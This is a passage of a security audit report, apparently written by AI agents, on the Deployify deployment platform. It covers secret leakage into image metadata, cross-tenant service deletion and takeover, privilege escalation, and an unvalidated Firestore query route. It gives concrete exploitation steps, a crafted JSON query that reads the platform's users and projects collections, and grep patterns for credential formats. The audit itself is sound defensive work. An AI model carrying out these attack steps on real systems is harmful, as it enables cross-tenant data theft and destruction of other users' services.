- **Failure scenario:** A user marks DATABASE_URL as a secret with target 'both' (the default assigned at src/app/api/projects/route.ts:191). The build emits a Dockerfile containing `ARG DATABASE_URL` / `ENV DATABASE_URL=$DATABASE_URL`; Docker resolves ENV at build time, so the final image config's Env array literally contains `DATABASE_URL=postgresql://app:S3cr3t@.../prod`. The image is pushed to `${region}-docker.pkg.dev/${gcpProjectId}/deployify-images/...` (cloudbuild.ts:92-94) under both the commit tag and `:latest`. `docker inspect` or a plain manifest+config blob fetch on that image returns the password, and it stays there after the user rotates the credential or deletes the env var, because rotation only rewrites Firestore/Secret Manager and never touches previously pushed images.
- **Impact:** Every credential ever used at build time is permanently readable from image metadata in the shared Artifact Registry, for every historical build and every PR preview image. Rotation gives no actual revocation for anyone who already pulled or can still pull the image. Combined with the build-injection finding, a tenant who executes code in the build environment can enumerate and read other tenants' images.
- **Evidence:**

```ts
src/lib/gcp/cloudbuild.ts:135-140
    Object.entries(buildEnvVars).forEach(([key, value]) => {
        dockerBuildArgs.push('--build-arg', `${key}=${value}`);
        dockerArgDeclarations.push(`ARG ${key}`);
        // ENV references the ARG value using $$VAR syntax (escaped for Cloud Build)
        dockerEnvFromArgs.push(`ENV ${key}=$$${key}`);
    });

buildEnvVars holds fully decrypted user secrets and Secret-Manager-sourced DB URLs:
src/lib/db.ts:234-248
        if (env.isSecret && env.isEncrypted) {
            value = decrypt(env.value);
        }
        if (env.target === 'build' || env.target === 'both') {
            buildEnvVars[env.key] = value;
        }
src/lib/db.ts:378
                        buildEnvVars[envKey] = connectionString;   // straight from getSecretValue()
```
- **Agent says it ruled out:** Confirmed the codebase has a non-leaking alternative it uses elsewhere: runtime connector credentials go through Secret Manager mounts (`--set-secrets`, cloudbuild.ts:388, populated at src/lib/db.ts:343) rather than plain env. Docker BuildKit secret mounts (`--mount=type=secret`) are not used anywhere — `rg -n "type=secret" src` returns nothing. Image cleanup exists only on project deletion (deleteProjectImages, src/app/api/projects/[id]/route.ts:10), not on secret rotation or env-var deletion.

### 🟡 MEDIUM — Viewers can delete environment variables — DELETE is the only handler in the env route missing the role gate
- **Location:** `src/app/api/projects/[id]/env/route.ts:309`
- **Category:** `broken-access-control`
- **Failure scenario:** A team member with the read-only `viewer` role sends `DELETE /api/projects/<id>/env?envId=<id>` for each variable returned by the GET handler (which happily lists every env var and its id to viewers, line 39-44). The handler drops them from the project document. The next deployment runs getEnvVarsForDeployment with an empty set, so the Cloud Run service is redeployed without DATABASE_URL, API keys, etc.
- **Impact:** A principal the product defines as read-only can silently destroy a project's entire secret configuration and break the next production deploy. Because the plaintext of secret values is never recoverable from the UI (GET masks them, reveal is 403 for viewers), the owner cannot restore what was deleted without re-sourcing every credential.
- **Evidence:**

```ts
src/app/api/projects/[id]/env/route.ts:289-325 (DELETE)
        const access = await checkProjectAccess(session.user.id, id);
        if (!access.allowed) {
            return NextResponse.json({ error: access.error }, { status: access.status });
        }
        const { project } = access;          // <-- line 309, no role check
        const { searchParams } = new URL(request.url);
        const envId = searchParams.get('envId');
        ...
        const filteredEnvs = envVariables.filter((env: EnvVariable) => env.id !== envId);
        await updateProject(id, { envVariables: filteredEnvs });

Contrast, POST at line 75 and PUT at line 190 in the same file:
        if (access.role === 'viewer') {
            return NextResponse.json(
                { error: 'Forbidden: Viewers cannot manage environment variables' },
                { status: 403 }
            );
        }
```
- **Agent says it ruled out:** Checked the same file for the gate (present at :75 for POST and :190 for PUT — so the omission is not a deliberate policy), checked the reveal sub-route (src/app/api/projects/[id]/env/[envId]/reveal/route.ts:30 blocks viewers), and checked src/middleware/rbac.ts — checkProjectAccess only returns the role, it never enforces write permission. src/proxy.ts performs no per-method role enforcement.

### 🟡 MEDIUM — Provider API key secrets are orphaned in Secret Manager when a storage connector is deleted
- **Location:** `src/app/api/projects/[id]/storage/route.ts:315`
- **Category:** `secret-lifecycle`
- **Failure scenario:** A user connects a PlanetScale (or Neon / Supabase / MongoDB Atlas) connector and supplies `providerApiKey` — an org-scoped provider admin token used at src/lib/gcp/external-sync.ts:139-186 to create and delete database passwords. Later they delete the connector via `DELETE /api/projects/<id>/storage?storageId=<sid>`. `deployify-<projectId>-<sid>-conn` is destroyed but `deployify-<projectId>-<sid>-apikey` is left in GCP Secret Manager forever, with whatever IAM bindings were added to it by grantSecretAccess (src/lib/gcp/secrets.ts:70-137, called from remediation-utils.ts:202/228 for tenant Cloud Run service accounts). Firestore no longer references it, so no UI, audit view, or rotation job can ever see or clean it.
- **Impact:** Long-lived third-party provider admin tokens accumulate indefinitely in the platform's Secret Manager after the customer believes they revoked them, still readable by tenant service accounts that were granted secretAccessor while the connector existed. The user has no way to discover or remove them, and Deployify has no inventory of them — a persistent, invisible credential store that grows with every connector churn.
- **Evidence:**

```ts
Creation stores two distinct secrets (src/app/api/projects/[id]/storage/route.ts:154-165):
        if (finalConnectionString) {
            const secretId = `deployify-${id}-${storageId}-conn`;
            connectionStringSecretId = await upsertSecret(secretId, finalConnectionString);
        }
        if (providerApiKey) {
            const apiKeySecretId = `deployify-${id}-${storageId}-apikey`;
            providerApiKeySecretId = await upsertSecret(apiKeySecretId, providerApiKey);
        }

Deletion removes only the first (same file, :314-318):
        // 2. Delete from Secret Manager if applicable
        if (storageConfig.connectionStringSecretId) {
            const secretId = `deployify-${id}-${storageId}-conn`;
            await deleteSecret(secretId);
        }
        // 3. Remove from Project in Firestore
        const filteredConfigs = storageConfigs.filter((s: StorageConfig
… (truncated)
```
- **Agent says it ruled out:** Grepped for any other cleanup of the apikey secret: `rg -n "apikey" src/app/api src/lib` shows the id is only ever constructed at storage/route.ts:163 (create) and in the PATCH path; `rg -n "deleteSecret" src` returns exactly two hits — the definition at src/lib/gcp/secrets.ts:164 and the single conn-only call at storage/route.ts:317. No cron job cleans orphans: src/app/api/cron/optimize/route.ts:200 only reads providerApiKey, it never deletes. No secret-version disable/destroy exists anywhere (`rg -n "destroy|:disable"` over src/lib and src/app/api returns only socket.destroy in storage-validator.ts).

> **Coverage notes (D6):** Swept and read end-to-end: src/lib/crypto.ts, src/lib/config.ts, src/lib/gcp/secrets.ts, src/lib/utils/masking.ts, src/lib/security/index.ts, src/lib/billing/payments.ts (signature verification), env.example, src/app/api/projects/[id]/env/route.ts (all four handlers), src/app/api/projects/[id]/env/[envId]/reveal/route.ts, src/app/api/projects/[id]/storage/route.ts (POST/PATCH/DELETE), src/app/api/projects/[id]/storage/[storageId]/rotate/route.ts, .../export/iac/route.ts, src/app/api/projects/route.ts (create), src/app/api/projects/[id]/route.ts (GET/PATCH), src/app/api/projects/[id]/deployments/[deployId]/logs/route.ts, src/middleware/rbac.ts, src/lib/db.ts (getEnvVarsForDeployment, getMigrationsForDeployment), src/lib/gcp/cloudbuild.ts (full config generation + submit), src/lib/dockerfiles.ts, src/lib/gcp/external-sync.ts (provision/sync/rotate paths), src/app/api/webhooks/github/route.ts (push + PR-close cleanup).

Repo-wide greps run: hardcoded credentials (`AIza|sk_live|sk_test|rzp_|-----BEGIN|ghp_|gho_|github_pat_|xoxb-` over src scripts public templates) — only hit is the harmless mock literal `keyId: 'rzp_test_mock'` at src/app/api/billing/checkout/route.ts:51, not a real credential, so not reported. `NEXT_PUBLIC_` — single hit (NEXT_PUBLIC_APP_URL), no secret is exposed to the client bundle. All crypto primitives (`createHash|createHmac|randomBytes|pbkdf2|scrypt|bcrypt|argon`). All encrypt/decrypt call sites (only 8 in the repo). All `getSecretValue` call sites in src/app/api. Secret-shaped console logging.

Findings I considered and deliberately dropped as too weak to report:
- Razorpay signature verification uses `generatedSignature === signature` (src/lib/billing/payments.ts:63, 82) instead of crypto.timingSafeEqual, which the GitHub webhook path does use (src/lib/security/index.ts:69). Factual inconsistency, but a remote timing attack on a V8 string compare is not a demonstrable exploit, so it does not meet the bar.
- decrypt()'s silent passthrough (crypto.ts:41-47: `if (!text.startsWith('enc:')) return text;` and `if (parts.length !== 4) return text;`) combined with the PUT heuristic at env/route.ts:239-241 (`if (!updatedEnv.value.startsWith('enc:')) { encrypt(...) }`) does let a value that literally begins with `enc:` be stored in plaintext while flagged isEncrypted. Real, but the only party harmed is the user who typed that value, so there is no attacker-favourable scenario.
- Old GCP Secret Manager versions are never disabled or destroyed after rotate (no destroy/disable call exists anywhere), so a "rotated" secret's prior version stays enabled. Real hygiene gap, but the principals who can read v1 could already read it before rotation, so I could not build a concrete escalation.
- GET /api/projects/[id] returns the whole project document (including `githubToken`) to viewers, bypassing the /env masking — but the values returned are AES-GCM ciphertext, not plaintext, so impact is low.

Not covered (out of scope or not reachable from this dimension): src/app/api/v1/collect and public/deployify-insights.js analytics ingest, the public reverse proxy at src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, Stripe webhook handling, the Data Lab query engine's SQL-injection surface (src/app/api/projects/[id]/storage/[storageId]/query/route.ts is ~950 lines and warrants its own pass), and src/cli/index.js (lines 571 and 774 print connection strings to the operator's own terminal — worth a look from a CLI/UX dimension but not a server-side leak). I also did not read .env.local, deliberately.


## D7. Multi-tenancy data isolation  <sub>`tenancy-data`</sub>

### 🔴 CRITICAL — Project deletion prefix-matches Cloud Run services and destroys other tenants' running services
- **Location:** `src/app/api/projects/[id]/route.ts:328`
- **Category:** `cross-tenant-destruction`
- **Failure scenario:** All tenants' Cloud Run services live in ONE GCP project (config.gcp.projectId) and are named `dfy-<slug>` (src/lib/utils.ts:53-57). Attacker creates a project with body {name: "a", repoFullName: <any repo they can read>} -> slug "a". They PATCH region to the victim's region (region is in the allowlist at src/app/api/projects/[id]/route.ts:134). They then DELETE /api/projects/<their-own-id>. checkProjectAccess passes (they own it). prefix becomes `dfy-a`, listServices issues `filter=metadata.name:dfy-a*`, which returns EVERY service in that region whose name starts with dfy-a — e.g. victim tenants' `dfy-acme-store`, `dfy-analytics`, `dfy-api-gateway` — and the loop calls deleteService on each. Every one of those tenants' production apps goes offline permanently.
- **Impact:** Unauthenticated-to-the-victim, one-request destruction of arbitrary other tenants' production Cloud Run services in any region. No recovery except redeploy; domain mappings and traffic tags are lost with the service.
- **Evidence:**

```ts
// Use a prefix that matches both production and preview services
            const prefix = `dfy-${projectSlug.substring(0, 40)}`;
            const services = await listServices(prefix, accessToken, region);

            for (const service of services) {
                // Extract service name from full resource name
                // Service name is projects/{project}/locations/{location}/services/{serviceName}
                const serviceName = service.name.split('/').pop();
                if (serviceName) {
                    await deleteService(serviceName, accessToken, region);
                }
            }

// src/lib/gcp/cloudrun.ts:99
        `${CLOUD_RUN_API}/${parent}/services?filter=metadata.name:${prefix}*`,
```
- **Agent says it ruled out:** Read listServices end-to-end (src/lib/gcp/cloudrun.ts:89-118) — it is a pure name-prefix wildcard filter with no label/owner/tenant predicate. deleteService (same file) takes only a name. Grepped the DELETE handler for any per-service ownership re-check before deleteService: there is none, only `if (serviceName)`. checkProjectAccess (src/middleware/rbac.ts:8-33) only authorizes the *deleting* project, not the services matched by the prefix. No allowlist of slugs and no `dfy-<slug>-` (trailing-dash) anchoring.

### 🔴 CRITICAL — Project slugs are only unique per user, but Cloud Run service names and public hostname routing are global
- **Location:** `src/app/api/projects/route.ts:123`
- **Category:** `tenant-namespace-collision`
- **Failure scenario:** `name` is attacker-controlled request-body input (src/app/api/projects/route.ts:35, 119-120) and uniqueness is checked with getProjectBySlug(session.user.id, slug) — scoped to the attacker's own projects only. Attacker creates a project named exactly like victim tenant's project (slug "acme-store"). Two consequences: (1) DEPLOY — src/lib/gcp/cloudbuild.ts:92 and src/lib/deployment.ts:82 build the Cloud Run service name as generateServiceName(project.slug) = `dfy-acme-store` and the image as `<region>-docker.pkg.dev/<gcpProject>/<registry>/dfy-acme-store:latest`, so the attacker's deploy overwrites the victim's live service revision, its --update-env-vars (mounting the ATTACKER's env/secrets), and the victim's `:latest` image tag. (2) PUBLIC ROUTING — src/proxy.ts:99-111 rewrites `acme-store.<basedomain>/*` to /api/v1/proxy/acme-store, which calls getProjectBySlugGlobal with .limit(1) and no orderBy; Firestore resolves that to the lexicographically-smallest doc id. Project ids are `proj_` + Math.random() base36 (src/lib/utils.ts:20-24), so the attacker simply creates projects until one sorts before the victim's — roughly a 50% hit per attempt — and the victim's public hostname then serves the attacker's Cloud Run app (and the attacker's analyticsApiKey script tag) to the victim's visitors.
- **Impact:** Cross-tenant takeover of a live production service and of a tenant's public hostname: serving attacker content to the victim's users, hijacking their traffic and analytics, and clobbering the victim's container image and runtime environment.
- **Evidence:**

```ts
// Check if slug already exists for this user
        const existingProject = await getProjectBySlug(session.user.id, slug);
        if (existingProject) {
            return NextResponse.json(
                { error: 'A project with this name already exists' },

// src/lib/db.ts:671
export async function getProjectBySlugGlobal(slug: string): Promise<Project | null> {
    const snapshot = await db
        .collection(Collections.PROJECTS)
        .where('slug', '==', slug)
        .limit(1)
        .get();

// src/lib/utils.ts:53
export function generateServiceName(resourceSlug: string): string {
    const baseName = resourceSlug.substring(0, 59);
    return `dfy-${baseName}`.replace(/-+$/, '');
}
```
- **Agent says it ruled out:** Grepped every write path for global slug uniqueness: only getProjectBySlug(userId, slug) exists; getProjectBySlugGlobal is defined at src/lib/db.ts:671 and never used to reject a duplicate at creation. Confirmed PATCH /api/projects/[id] allowedFields (lines 127-144) does not include `slug`, so the value is fixed at creation and cannot be repaired by the victim. Confirmed src/proxy.ts reservedSubdomains (line 96) only blocks platform names, not tenant collisions. Confirmed the deploy path (src/app/api/projects/[id]/deploy/route.ts:171-176) and the Cloud Build config both derive the name purely from project.slug, with no project id or tenant id mixed in.

### 🟠 HIGH — Removing a team member deletes only one membership document, so duplicate memberships silently preserve access
- **Location:** `src/lib/db.ts:718`
- **Category:** `broken-access-control`
- **Failure scenario:** acceptInvite performs no check for an existing membership and always mints a fresh `tm_<random>` document. POST /api/teams/T/invite can be called repeatedly for the same address (no duplicate-invite check), and each invite carries its own 7-day token. Insider Mallory, a member of team T who expects to be removed, gets two invites issued to her address (a re-send is a normal support flow, and she can request one) and accepts BOTH -> two TEAM_MEMBERSHIPS docs for (T, mallory). The owner later removes her: the DELETE handler resolves ONE membership via getTeamMembership (.limit(1)) and calls deleteTeamMembership(targetMembership.id), deleting only that document. The second document survives, so the next getTeamMembership(T, mallory) succeeds and checkProjectAccess (src/middleware/rbac.ts:16-21) returns allowed for every project in team T. The UI shows her as removed.
- **Impact:** Persistent post-revocation access for an offboarded or malicious team member: full read/write on all team projects, env variables, storage connectors and Data Lab queries, while the owner believes access was revoked. The same defect lets a stale duplicate silently restore a previously demoted role.
- **Evidence:**

```ts
export async function acceptInvite(inviteId: string, userId: string): Promise<void> {
    ...
    const membershipId = generateId('tm');
    const membership: TeamMembership = {
        id: membershipId,
        teamId: invite.teamId,
        userId,
        role: invite.role,
        joinedAt: now,
    };
    const batch = db.batch();
    // Create membership
    batch.set(db.collection(Collections.TEAM_MEMBERSHIPS).doc(membershipId), membership);

// src/lib/db.ts:751 (the only membership lookup used for authorization)
    const snapshot = await db
        .collection(Collections.TEAM_MEMBERSHIPS)
        .where('teamId', '==', teamId)
        .where('userId', '==', userId)
        .limit(1)
        .get();

// src/app/api/teams/[id]/members/[userId]/route.ts:64
        await deleteTeamMembership(targetMembership.id);
```
- **Agent says it ruled out:** Grepped the whole tree for `existingMembership`, `alreadyMember`, `already a member` — zero hits. deleteTeam (src/lib/db.ts:835-838) does delete ALL matching membership docs via a query, proving the single-doc delete in the member route is the outlier. Verified the members DELETE handler (lines 24-64) performs no re-query loop and that listTeamMembers (src/lib/db.ts:872) — which would expose the duplicates — is only consulted for the last-owner count, not for deletion.

### 🟠 HIGH — Team admins can escalate themselves to owner by issuing an owner-role invite to their own email
- **Location:** `src/app/api/teams/[id]/invite/route.ts:57`
- **Category:** `privilege-escalation`
- **Failure scenario:** Mallory holds role 'admin' on team T. She POSTs /api/teams/T/invite {email: 'mallory@her-own-domain.com', role: 'owner'}. The handler only gates on owner-OR-admin and then accepts 'owner' because it is in validRoles — there is no equivalent of the guard the role-update endpoint enforces. The invite email lands in her own inbox. She DELETEs herself from the team (the members DELETE handler at line 25 lets an admin remove another admin, including herself), then POSTs /api/invites/accept {token}. src/app/api/invites/accept/route.ts:44 calls acceptInvite, which writes a membership with role: invite.role = 'owner' without verifying that session.user.email matches invite.email. She is now team owner.
- **Impact:** Vertical privilege escalation admin -> owner, defeating every owner-only control: promoting/demoting owners, removing owners, deleting the team (which cascades to deleting all team projects via deleteTeam -> deleteProject), and taking over billing.
- **Evidence:**

```ts
const membership = await getTeamMembership(id, session.user.id);

        if (!membership || (membership.role !== 'owner' && membership.role !== 'admin')) {
            return NextResponse.json(
                { error: 'Forbidden. You must be an owner or admin to invite members.' },
        ...
        const { email, role = 'member' } = body;
        ...
        const validRoles = ['owner', 'admin', 'member', 'viewer'];
        if (!validRoles.includes(role)) {
             return NextResponse.json({ error: 'Invalid role' }, { status: 400, ... });
        }
        const token = crypto.randomUUID();
        const invite = await createInvite(id, email, role as TeamRole, session.user.id, token);
```
- **Agent says it ruled out:** Compared against the sibling role-change endpoint, which explicitly implements the missing check: src/app/api/teams/[id]/members/[userId]/route.ts:115 `if (role === 'owner' && requesterMembership.role !== 'owner')` -> 403. That guard exists nowhere in the invite creation path. Also confirmed src/app/api/invites/accept/route.ts checks only `invite.expiresAt < new Date()` (line 37) and never compares session.user.email to invite.email, and that acceptInvite (src/lib/db.ts:718-749) copies invite.role verbatim with no re-authorization of the inviter.

### 🟠 HIGH — Public dashboard widget executes its saved query against any connector id supplied in the URL
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:38`
- **Category:** `broken-access-control`
- **Failure scenario:** A widget document persists its own binding (`storageId`) at creation — src/app/api/projects/[id]/storage/dashboards/route.ts:83-93 stores {query, storageId, isPublic}. The public execution path re-reads the query from the widget but resolves the connector from the URL segment `storageId` and never compares it to widgetData.storageId. The unauthenticated share page GET (src/app/api/projects/[id]/storage/dashboards/[dashboardId]/route.ts:32-56) returns the FULL widget document — including storageId and the raw query — to anyone with the link, and the same endpoint returns every widget's data for any public widget in the project. So an anonymous visitor holding one share link for project P (which publishes a curated query against a read-only reporting connector) can POST /api/projects/P/storage/<other-connector-id>/query {widgetId} and run that same SELECT against P's production database connector instead — completely outside any session, checkProjectAccess never runs on this branch (`access` stays null).
- **Impact:** Anonymous execution of queries against storage connectors that were never published, using the platform's Secret Manager credentials for those connectors. Only PII-shaped strings are redacted (see maskData), so all non-PII columns — order values, internal identifiers, business records — are returned verbatim.
- **Evidence:**

```ts
if (widgetId) {
            // Public Widget Path: No session required, but must be a valid public widget
            const db = getDb();
            const widgetDoc = await db.collection(Collections.PROJECTS).doc(id).collection('storage_dashboards').doc(widgetId).get();
            ...
            const widgetData = widgetDoc.data();
            if (!widgetData?.isPublic) { ... 403 ... }

            // Enforce the saved query for public access
            query = widgetData.query;
            ...
                const projectDoc = await db.collection(Collections.PROJECTS).doc(id).get();
                const projectData = projectDoc.data();
                storageConfig = projectData?.storageConfigs?.find((s: StorageConfig) => s.id === storageId);
```
- **Agent says it ruled out:** Read the widget branch end-to-end (lines 35-59): the only guard is `widgetData.isPublic`; there is no `widgetData.storageId === storageId` comparison anywhere in the file (grepped for widgetId at lines 28/35/38/943/984/1033). Confirmed the masking fallback at line 943 (`const shouldMask = widgetId || access?.role === 'viewer'`) does apply, but read src/lib/utils/masking.ts:6-44 — maskString only rewrites email/phone/credit-card/SSN/`key|token|auth|secret`-prefixed patterns, so ordinary column data passes through unmasked. Confirmed the legitimate client (src/app/share/dashboard/[id]/page.tsx:79) sends widget.storageId, i.e. the server is trusting a value the client is free to change.

### 🟡 MEDIUM — Query comments are read and written by queryId alone, with no tenant filter
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/queries/[queryId]/comments/route.ts:38`
- **Category:** `idor`
- **Failure scenario:** checkProjectAccess authorizes the `id` path segment, but the Firestore query is filtered only on `queryId` — the `projectId` field that POST writes at line 88 is never used as a predicate. A user who was previously a member of victim project V (and therefore saw saved-query ids in the Data Lab UI and its network traffic) is removed from V. They keep any project of their own, P, and call GET /api/projects/P/storage/x/queries/<V-query-id>/comments. checkProjectAccess(user, P) succeeds, and the handler returns every comment on V's saved query — including userId and userName of V's current members and whatever the comment text discusses (schema details, incident notes, query rationale). POST on the same URL injects a comment carrying {queryId: V-query-id, projectId: P} which, because the GET filters only on queryId, renders inside V's Data Lab for all of V's members.
- **Impact:** Post-revocation cross-tenant read of another project's query discussion threads plus the identities of its members, and the ability to inject attacker-authored content into that tenant's UI.
- **Evidence:**

```ts
const { id, queryId } = await params;
        const access = await checkProjectAccess(session.user.id, id);
        if (!access.allowed) { ... }
        ...
        const commentsSnapshot = await db
            .collection(Collections.QUERY_COMMENTS)
            .where('queryId', '==', queryId)
            .orderBy('createdAt', 'asc')
            .get();
```
- **Agent says it ruled out:** Confirmed the sibling routes in the same feature DO carry the tenant predicate, so this is an omission rather than a design choice: queries/route.ts:41-42 filters `projectId == id` AND `storageId == storageId`; history/route.ts:40-42 filters projectId, storageId AND userId; audit/route.ts:60-61 filters projectId and storageId; schema-docs/route.ts:27-28 filters projectId and storageId. Also confirmed queries/[queryId]/route.ts guards its PATCH/DELETE with `doc.data()?.userId !== session.user.id` (lines 38, 84) — the comments route has no equivalent ownership or project check on the fetched documents.

### 🟡 MEDIUM — Analytics stats silently substitute randomly generated fake data when the query is empty or fails
- **Location:** `src/lib/analytics.ts:99`
- **Category:** `data-integrity`
- **Failure scenario:** The Firestore branch runs `.where('projectId','==',projectId).where('timestamp','>=',startDate).orderBy('timestamp','desc')` (lines 93-97), a composite query. firestore.indexes.json declares composite indexes only for `projects`, `deployments` and `envVars` — nothing for `analytics_events` — so in a real deployment Firestore rejects it with FAILED_PRECONDITION, the catch at line 183 swallows it, and getMockData returns Math.random() traffic. The same happens on the ordinary empty-result path: a brand-new project with zero visitors gets `snapshot.empty` and is handed fabricated numbers. GET /api/projects/<id>/analytics/stats (src/app/api/projects/[id]/analytics/stats/route.ts:34-39) returns this under the key `stats` with no mock flag, so the tenant's dashboard shows thousands of invented visitors, invented per-day timeseries, invented traffic sources (Google/Direct/Twitter) and invented Core Web Vitals, indistinguishable from real telemetry.
- **Impact:** Tenants make retention, marketing and performance decisions on fabricated numbers, and a real analytics outage (missing index, Firestore error, credential failure) is completely invisible because the failure path emits plausible data instead of an error.
- **Evidence:**

```ts
if (snapshot.empty) {
            return getMockData(period);
        }
        ...
    } catch (error) {
        console.error('Error fetching internal analytics:', error);
        return getMockData(period);
    }

// src/lib/analytics.ts:189
export function getMockData(period: string): AnalyticsStats {
    const timeseries = Array.from({ length: days }, (_, i) => {
        ...
        return {
            date: date.toISOString().split('T')[0],
            visitors: Math.floor(Math.random() * 100) + 20,
            pageviews: Math.floor(Math.random() * 200) + 50,
        };
```
- **Agent says it ruled out:** Verified the route does not gate on MOCK_DB: getMockData is called from the production code paths at lines 100 and 185, while the MOCK_DB guard (line 12-14) only short-circuits the BigQuery helper. Verified no flag distinguishes mock from real in the response — src/app/api/projects/[id]/analytics/stats/route.ts:36-39 returns `{ stats }` verbatim. Verified firestore.indexes.json (78 lines, read in full) contains no `analytics_events` collectionGroup entry, so the composite query has no declared index.

### 🟡 MEDIUM — Analytics aggregation performs an unbounded Firestore read over a caller-controlled time range
- **Location:** `src/lib/analytics.ts:93`
- **Category:** `resource-exhaustion`
- **Failure scenario:** `period` is taken straight off the query string — src/app/api/projects/[id]/analytics/stats/route.ts:16 `searchParams.get('period') || '30d'` — and passed through to parseInt with no ceiling. Any authenticated user with access to a project (including a team member with role 'viewer') requests GET /api/projects/<id>/analytics/stats?period=999999d. startDate moves ~2700 years into the past, so the predicate matches every analytics_events document ever written for that project, and the query has no .limit(). All matching documents are materialised into `snapshot.docs` and then into the `events` array, plus a `treatedPageviews` Set and a per-day visitor Set built over all of them. Repeating the call concurrently (the proxy rate limit in src/proxy.ts:122 allows 100 requests/min per IP+path) drives the shared Next.js server to OOM.
- **Impact:** A single low-privilege tenant can exhaust the memory of the shared application server — taking down the dashboard and the /api/v1/proxy path for every other tenant on the instance — and can run up unbounded Firestore document-read billing.
- **Evidence:**

```ts
const days = parseInt(period.replace('d', '')) || 30;
        ...
        const now = new Date();
        const startDate = new Date();
        startDate.setDate(now.getDate() - days);

        // Query Firestore for events
        const db = getDb();
        const snapshot = await db.collection(Collections.ANALYTICS_EVENTS)
            .where('projectId', '==', projectId)
            .where('timestamp', '>=', startDate)
            .orderBy('timestamp', 'desc')
            .get();
        ...
        const events = snapshot.docs.map(doc => ({ id: doc.id, ...(doc.data() as AnalyticsEvent) }));
```
- **Agent says it ruled out:** Grepped the function for .limit() — there is none on either analytics query (line 93 and getRealtimeStats at line 242); by contrast listDeploymentsByProject (src/lib/db.ts:1220), listAuditLogs (src/lib/audit.ts:44), the storage metrics route (line 56) and the audit route (line 63) all bound their reads. Confirmed the route performs no validation or clamping of `period` before passing it in, and that the BigQuery pre-check (getStatsFromBigQuery) returns [] on any error, so the unbounded Firestore path is the normal fallback rather than a rare one.

> **Coverage notes (D7):** Read end-to-end: src/lib/db.ts (all 1272 lines), src/lib/firebase.ts, src/lib/audit.ts, src/lib/analytics.ts, src/lib/analytics/alerts.ts, src/lib/logging/tracker.ts, src/lib/logging/parser.ts, firestore.indexes.json, src/middleware/rbac.ts, src/proxy.ts. Enumerated all 87 `.collection(` call sites across src/lib and src/app/api and read every route that queries a shared collection without an obvious tenant predicate: the six storage/[storageId]/* sub-routes (queries, queries/[queryId], comments, history, audit, metrics, schema-docs), storage/dashboards + [dashboardId], storage/[storageId]/query (Data Lab), v1/collect, v1/proxy/[slug], cron/optimize, billing (tracker, invoices, invoice download), teams (invite, invites/[inviteId], members/[userId], audit), invites/accept, projects (list/create/get/patch/delete) and all deployments/[deployId]/* sub-routes.

Ruled out after checking the code rather than assuming: (a) missing Firestore security rules — grepped for `NEXT_PUBLIC_FIREBASE` and `from 'firebase/` and found zero client-SDK usage, so all access is firebase-admin server-side and rules are not the boundary; (b) deployments/[deployId] IDOR — alias, rollback and logs all verify `deployment.projectId !== id` (lines 33, 31, 33 respectively); (c) invoice IDOR — the download route checks `invoice.userId !== session.user.id`; (d) saved-query PATCH/DELETE IDOR — both check `doc.data()?.userId !== session.user.id`; (e) cron/optimize auth — the CRON_SECRET check fails closed in production even when the secret is unset; (f) deleted-team orphans — deleteTeam removes all memberships, invites and projects, and listTeamsWithMembership filters non-existent team docs; (g) getProjectByRepoFullName global lookup — real collision risk but a private repo cannot be claimed by another tenant (getRepo runs with the claimant's token), so impact stayed below the medium bar.

Two things I could NOT verify from the repo: whether firestore.indexes.json is actually deployed (no firebase.json and no CI step references it — this is why the analytics fake-data finding is rated on the empty-result path as well as the missing-index path), and the runtime Firestore ordering guarantee behind the `.limit(1)` slug race (the takeover in finding 2 does not depend on it — the shared Cloud Run service name is deterministic regardless). Not covered by this dimension: the SQL/NoSQL injection surface in storage/[storageId]/query (unauthenticated `variables` are string-interpolated into Mongo/Redis commands at lines 123-132), the use of Math.random() for id generation in src/lib/utils.ts:20, and the hardcoded shared `deployify-dashboard-internal` analytics key in v1/collect — all better handled by the injection and crypto dimensions.


## D8. Input validation, rate limiting & DoS  <sub>`input-validation-dos`</sub>

### 🔴 CRITICAL — Data Lab Firestore connector passes an unvalidated `collection` name from the request body to the platform's own admin Firestore client
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:899`
- **Category:** `input-validation`
- **Failure scenario:** `getDb()` (line 854) is Deployify's OWN control-plane Firestore admin handle from `src/lib/firebase.ts` — there is no per-tenant credential for the `firestore` connector type. Any signed-up user creates a project, then POSTs to /api/projects/{own-id}/storage with `{"type":"firestore","name":"x"}`. `src/app/api/projects/[id]/storage/route.ts:88` only checks `if (!type || !name)` — `type` has no allowlist — and because `provision` is falsy the config is persisted with `status = 'active'` (line 92 default). The attacker then POSTs to /api/projects/{own-id}/storage/{storageId}/query with `{"query":"{\"collection\":\"users\",\"limit\":500}"}`. `checkProjectAccess` passes (it is their own project), `collection` is interpolated straight into `db.collection()`, and 500 documents of the platform `users` collection are returned in the JSON response. Repeating with `"collection":"projects"` returns every tenant's project document including `envVariables` (non-secret values are stored in cleartext per src/app/api/projects/[id]/env/route.ts:121 `const storedValue = isEncrypted ? encrypt(value) : value`), `analyticsApiKey`, and `storageConfigs`. The `where` array (line 901-906) is equally unvalidated and lets the attacker page past MAX_ROWS by filtering on document fields.
- **Impact:** Full cross-tenant read of the platform control plane — all users, all projects, all environment variables and analytics API keys — from an ordinary free account, with no exploit primitive beyond a JSON string.
- **Evidence:**

```ts
854:  const db = getDb();
...
893:  const { collection, limit = 10, where } = parsedQuery;
896:  if (!collection) {
897:      return NextResponse.json({ success: false, error: 'Collection name is required for Firestore query' }, { status: 400 });
898:  }
899:  queryObj = db.collection(collection);
901:  if (where && Array.isArray(where)) {
902:      where.forEach((w: [string, string, unknown]) => {
903:          if (w.length === 3) {
904:              // @ts-expect-error - Dynamic filter
905:              queryObj = queryObj.where(w[0], w[1], w[2]);
910:  const snapshot = await queryObj.limit(Math.min(limit, MAX_ROWS)).get();
```
- **Agent says it ruled out:** Grepped the route for getSession/checkProjectAccess — both present but they only authorize access to the attacker's OWN project id, not to the Firestore collection being read. Grepped for an allowlist of collection names (`Collections.` is imported but never used to validate `collection`). Grepped src/app/api/projects/[id]/storage/route.ts for validation of `type` against a whitelist — none exists; only `if (!type || !name)` at line 88. Confirmed `getDb` is the firebase-admin platform handle (src/lib/firebase.ts) and is not re-bound to a tenant project for the `firestore` branch.

### 🟠 HIGH — Attacker-controlled object keys are interpolated raw into `new RegExp` in the Data Lab query route, giving full regex injection and catastrophic backtracking
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/query/route.ts:101`
- **Category:** `redos`
